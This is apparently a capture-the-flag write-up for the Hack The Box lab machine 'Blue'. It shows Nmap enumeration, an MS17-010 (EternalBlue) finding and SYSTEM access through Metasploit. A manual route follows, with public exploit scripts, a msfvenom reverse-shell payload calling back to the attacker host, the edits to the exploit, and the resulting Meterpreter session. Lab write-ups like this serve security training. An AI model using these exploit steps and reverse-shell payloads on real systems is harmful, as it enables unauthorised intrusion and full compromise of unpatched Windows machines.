# Hackthebox Blue


Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.


## Recon

First, as always. we perform our initial enumeration of the box using Nmap.

```
# Nmap 7.70 scan initiated Mon Nov 12 09:50:51 2018 as: nmap -v -sV -p- -T4 -oA blue_full_scan 10.10.10.40
Increasing send delay for 10.10.10.40 from 0 to 5 due to 525 out of 1311 dropped probes since last increase.
Nmap scan report for 10.10.10.40
Host is up (0.065s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We see that the server is exposing netbios. This is usually a juicy target. SMB has had a lot of issues in the past. 

Running a vulnscan to find out more:

```
# Nmap 7.70 scan initiated Mon Nov 12 09:59:32 2018 as: nmap -v -sV -p135,139,445,49152,49153,49154,49155,49156,49157 --script vuln -oA blue_vuln_scan 10.10.10.40
Nmap scan report for 10.10.10.40
Host is up (0.080s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```

The box seems to be vulnerable to MS17-010(Eternal Blue).

## Initial Compromise

This box can easily be popped with Metasploit to gain instant SYSTEM access using the Eternal Blue exploit module. 

```
msf exploit(windows/smb/ms17_010_eternalblue) > exploit 

[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (206403 bytes) to 10.10.10.40
[*] Meterpreter session 2 opened (10.10.14.17:4444 -> 10.10.10.40:49159) at 2018-11-12 10:28:52 +0100
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : HARIS-PC
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > 
```

I will also take a more manual approach and try to exploit this service using a standalone exploit.

We need to download the following two files:

https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py
https://raw.githubusercontent.com/worawit/MS17-010/master/zzz_exploit.py

We need to generate a payload that will be uploaded and executed on the victim.

```
root@kali:~/htb/blue# msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.17 -f exe > meterpreter.exe
```

Then we need to make some modifications to the expliot to make it work.

The following two sections need to be modified:
```
USERNAME = '\\' # Modified for blue                                                                               
PASSWORD = ''  
```

```
smb_send_file(smbConn, '/root/htb/blue/meterpreter.exe', 'C', '/meterpreter.exe') # modified for blue                                                         
service_exec(conn, r'cmd /c c:\\meterpreter.exe') # modified for blue 
```

Set up a listener and run the exploit to get a shell.

```
root@kali:~/htb/blue# python zzz_exploit.py 10.10.10.40 ntsvcs                                                                                                                              
Target OS: Windows 7 Professional 7601 Service Pack 1                                                                                                                                       
Target is 64 bit                                                                                                                                                                            
Got frag size: 0x10                                                                                                                                                                         
GROOM_POOL_SIZE: 0x5030                                                                                                                                                                     
BRIDE_TRANS_SIZE: 0xfa0                                                                                                                                                                     
CONNECTION: 0xfffffa8004811020                                                                                                                                                              
SESSION: 0xfffff8a008830560                                                                                                                                                                 
FLINK: 0xfffff8a002f63048                                                                                                                                                                   
InParam: 0xfffff8a009c4215c                                                                                                                                                                 
MID: 0x90a                                                                                                                                                                                  
unexpected alignment, diff: 0x-6cdffb8                                                                                                                                                      
leak failed... try again
CONNECTION: 0xfffffa8004811020
SESSION: 0xfffff8a008830560
FLINK: 0xfffff8a0032ff048
InParam: 0xfffff8a009c5f15c
MID: 0xa01
unexpected alignment, diff: 0x-6960fb8
leak failed... try again
CONNECTION: 0xfffffa8004811020
SESSION: 0xfffff8a008830560
FLINK: 0xfffff8a009ca3038
InParam: 0xfffff8a009ca215c
MID: 0xa0c
unexpected alignment, diff: 0x38
leak failed... try again
CONNECTION: 0xfffffa8004811020
SESSION: 0xfffff8a008830560
FLINK: 0xfffff8a000b91048
InParam: 0xfffff8a009cb215c
MID: 0xa0a
unexpected alignment, diff: 0x-9121fb8
leak failed... try again
CONNECTION: 0xfffffa8004811020
SESSION: 0xfffff8a008830560
FLINK: 0xfffff8a00814c048
InParam: 0xfffff8a009cda15c
MID: 0xa01
unexpected alignment, diff: 0x-1b8efb8
leak failed... try again
CONNECTION: 0xfffffa8004811020
SESSION: 0xfffff8a008830560
FLINK: 0xfffff8a00c91d048
InParam: 0xfffff8a009ce615c
MID: 0xa01
unexpected alignment, diff: 0x2c36048
leak failed... try again
CONNECTION: 0xfffffa8004811020
SESSION: 0xfffff8a008830560
FLINK: 0xfffff8a000bc5048
InParam: 0xfffff8a009cf215c
MID: 0xb0b
unexpected alignment, diff: 0x-912dfb8
leak failed... try again
CONNECTION: 0xfffffa8004811020
SESSION: 0xfffff8a008830560
FLINK: 0xfffff8a000b6b048
InParam: 0xfffff8a009cfe15c
MID: 0xb04
unexpected alignment, diff: 0x-9193fb8
leak failed... try again
CONNECTION: 0xfffffa8004811020
SESSION: 0xfffff8a008830560
FLINK: 0xfffff8a009d0a088
InParam: 0xfffff8a009d0415c
MID: 0xb03
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\pwned.txt on the target
Opening SVCManager on 10.10.10.40.....
Creating service Eues.....
Starting service Eues.....
```

Catch the shell:

```
msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.17:4444
[*] Sending stage (179779 bytes) to 10.10.10.40
[*] Meterpreter session 2 opened (10.10.14.17:4444 -> 10.10.10.40:49220) at 2018-11-14 19:48:28 +0100

meterpreter > sysinfo 
Computer        : HARIS-PC
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```
